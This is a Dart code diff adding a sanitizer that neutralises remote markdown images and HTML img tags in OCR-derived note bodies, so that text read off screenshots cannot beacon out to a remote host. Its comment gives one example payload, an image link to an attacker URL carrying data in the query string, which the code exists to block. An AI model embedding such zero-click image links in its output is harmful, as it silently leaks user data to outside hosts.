@@ -29,3 +29,34 @@ String sanitizeUntrustedMarkdown(String value) => value
     // `<img>` needs no click either.
     .replaceAll('<', '&lt;')
     .trim();
+
+/// The same defence for a capture's **body**, and a much narrower one.
+///
+/// The body is not model-authored — it is the processor's output — but for an
+/// image capture that is OCR text read off a file somebody else made, so
+/// `![](https://attacker/?d=…)` printed on a screenshot ends up in the vault
+/// note, in `inbox.md` and in the agent brief exactly as if the user had
+/// dictated it.
+///
+/// It cannot be escaped the way a title is. A body is many lines of text the
+/// user may well have dictated *as* markdown, and rewriting `<` or collapsing
+/// newlines there would corrupt their own notes. So only the two constructs
+/// that reach the network without a click are defused, and only when they point
+/// somewhere remote:
+///
+/// - `![alt](https://…)` degrades to a plain link. A local `![alt](diagram.png)`
+///   and the vault's own `![[attachments/…]]` wikilink are left alone — neither
+///   leaves the machine.
+/// - `<img …>` is the same construct in HTML, which Obsidian renders.
+///
+/// Everything else — emphasis, code fences, headings, links — survives, because
+/// none of it fetches anything on its own.
+String sanitizeUntrustedMarkdownBody(String value) => value
+    .replaceAllMapped(
+      RegExp(r'!(\[[^\]]*\]\(\s*(?:https?:)?//)'),
+      (Match match) => '\\!${match[1]}',
+    )
+    .replaceAllMapped(
+      RegExp(r'<(img\b)', caseSensitive: false),
+      (Match match) => '&lt;${match[1]}',
+    );
